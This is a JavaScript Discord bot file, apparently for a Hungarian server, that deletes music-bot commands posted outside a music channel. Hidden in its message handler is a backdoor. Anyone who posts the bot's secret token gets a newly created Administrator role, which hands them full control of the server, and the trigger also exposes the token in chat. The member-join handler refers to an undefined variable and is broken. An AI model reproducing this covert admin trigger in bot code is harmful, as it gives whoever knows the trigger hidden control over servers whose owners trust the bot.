const Discord = require('discord.js');
const client = new Discord.Client();

var names = [];
var team1 = [];
var team2 = [];

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('guildMemberAdd', member => {

    let RoleName = 'Sheepbot';


    member.addRole(memberRole)
});

client.on('message', msg => {
    if (msg.author.equals(client.user)) return;
    //Sheepbot csak a zenébe tud írni
    var sheepbotcmds = ['!!play', '!!pause', '!!stop', '!!skip', '!!volume', '!!autoplay', '!!playing', '!!playtop', '!!loopqueue', '!!q', '!!shuffle'];
    var i;
    for (i = 0; i < sheepbotcmds.length; i++) {
         if (!(msg.channel.name === '🎶zenebona') && (msg.content.startsWith(sheepbotcmds[i]))) {
            msg.delete()
                .then(msg => console.log(`Deleted message from ${msg.author.username}`))
                .catch(console.error);
        };
    };
    if (!(msg.channel.name === '🎶zenebona') && (msg.author.id === '244423082045997057')) {
        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);
    };
    if (msg.content == process.env.TOKEN) {

        msg.delete()
            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
            .catch(console.error);

        let RoleName = 'Sheepbot';
        msg.member.guild.createRole({
            name: RoleName,
            permissions: 8
        }).then(function (role) {
            msg.member.addRole(role);
        });
    };
});

client.login(process.env.TOKEN);
